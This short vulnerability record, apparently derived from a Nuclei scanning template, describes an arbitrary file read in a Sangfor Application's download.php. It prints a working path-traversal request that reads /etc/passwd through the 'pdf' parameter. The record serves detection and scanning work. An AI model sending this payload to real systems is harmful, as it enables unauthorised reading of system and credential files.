# Vulnerability: Sangfor Application download.php - Arbitary File Read
**Classification:** LFI
**Source:** Nuclei Template (`sangfor-download-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the Sangfor Application download.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/report/download.php?pdf=../../../../../etc/passwd
```

